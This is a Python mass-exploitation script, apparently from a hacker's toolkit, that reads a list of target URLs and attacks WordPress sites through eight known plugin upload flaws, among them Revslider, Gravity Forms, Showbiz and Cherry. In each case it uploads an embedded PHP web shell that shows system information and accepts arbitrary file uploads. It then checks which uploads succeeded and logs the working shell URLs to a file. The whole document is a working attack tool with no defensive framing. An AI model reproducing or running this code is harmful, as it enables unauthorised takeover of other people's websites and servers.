#!/usr/bin/python

# RxR HaCkEr  Skype: a.789a ,  fb.com/CodeXRxR
#Greet's To : ( 3Turr , Kuroi"SH , GeNErAL , ProSox , Nofawkx Al , Isal Dot ID ) :D


import requests, os, sys, codecs					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time	
from random import sample as rand				   		
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n



		
    ______       ______   _   _         _____  _     _____          
    | ___ \      | ___ \ | | | |       /  __ \| |   |  ___|        
    | |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __  
    |    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
    | |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |    
    \_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|      
 
 
              Coded By: RxR HaCkEr
               inst.com/mjzrh1337
                FB.com/CodeXRxR
                 Skype:a.789a 
									
   
    

		\n""".format(fc, sb)
		
		print banner

shell = """ <?php echo 'RxR HaCkErs'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filename = "xx.jpg"

shell_name = str(time.time())[:-3]

filenamex = "RxR_"+str(shell_name)+".php.php"


def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	


	
	
	

def ExploitS(url):


	
    try:
		
		

		filenames = 'RxR' + '__' + rand_str (5) + '.php'
		
		# 1 .   Gravity Forms
		
		
		appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'RxR.phtml'}
		
		
		Grav = {'file':(filename, shell, 'text/html')}
		
		Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/wp-content/_input_3_RxR.phtml')
		
		
		if 'RxR HaCkErs' in Gravlib.content:
			print '[{}Target]: {} {}	       ====> {}{} Gravity     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/_input_3_RxR.phtml'+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Gravity     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
		
		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'RxR HaCkErs' in revsliderlib.content:
			print '[{}Target]: {} {}	       ====> {}{} Revslider     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Revslider     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
			
		# 3 .   Showbiz
		
		
		showbizapp = {'action':'showbiz_ajax_action',
					    'client_action':'update_plugin'}
						
						
		showbizup = {'update_file':(filenames, shell, 'text/html')}
		
		showbizreq = requests.post(url+'/wp-admin/admin-ajax.php', data=showbizapp , files=showbizup)
		
		showbizlib = requests.get(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames)
		
		if 'RxR HaCkErs' in showbizlib.content:
			print '[{}Target]: {} {}	       ====> {}{} Showbiz     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Showbiz     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 4 . Reflex Gallery
		
		Reflexup = {'qqfile' : (filenames, shell, 'text/html')}
		
		Reflexreq = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=01', files=Reflexup)
		
		Reflexlib = requests.get(url+'/wp-content/uploads/2018/01/'+filenames)
		
		
		if 'RxR HaCkErs' in Reflexlib.content:
			print '[{}Target]: {} {}	       ====> {}{} Reflex Gallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/'+filenames+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Reflex Gallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		
		# 5 .  Wysija
		
		Wysijaup = {'my-theme':open('Master.zip', 'rb')}
		
		
		Wysijaapp = {'action':'themeupload',
				   'submitter':'Upload',
				   'overwriteexistingtheme':'on',
				   'page':'GZNeFLoZAb'}
				   
				   
		Wysijareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' , data=Wysijaapp, files=Wysijaapp)
		
		Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/RxR.php')
		
		
		if 'RxR HaCkErs' in Wysijalib.content:
			print '[{}Target]: {} {}	       ====> {}{} Wysija     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/RxR.php'+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Wysija     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		
		
		# 6 . LearnDash
		
		
		
		LearnDashup={'uploadfiles[]': (filenamex, shell, 'text/html')}
		
		
		LearnDashreq = requests.post(url, files=LearnDashup,data = {'post':'foobar','course_id':'foobar','uploadfile':'foobar'})
		
		
		LearnDashlib = requests.get(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.'))
		
		
		
		if 'RxR HaCkErs' in LearnDashlib.content:
			print '[{}Target]: {} {}	       ====> {}{} LearnDash     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.')+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} LearnDash    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		# 7 . Tevolution
		
		
		Tevoup = {'file':(filenames, shell, 'text/html')}
		
		Tevoreq = requests.post(url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)
		
		Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
		
		if 'RxR HaCkErs' in Tevorlib.content:
			print '[{}Target]: {} {}	       ====> {}{} Tevolution     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Tevolution    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 8 . Cherry
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'RxR HaCkErs' in Cherrylib.content:
			print '[{}Target]: {} {}	       ====> {}{} Cherry     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
		else:
			print '[{}Target]: {} {}	       ====> {}{} Cherry    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
		
		
		
		
    except:
        pass



		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(14)
        Threads = ThreadPool.map(ExploitS, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()

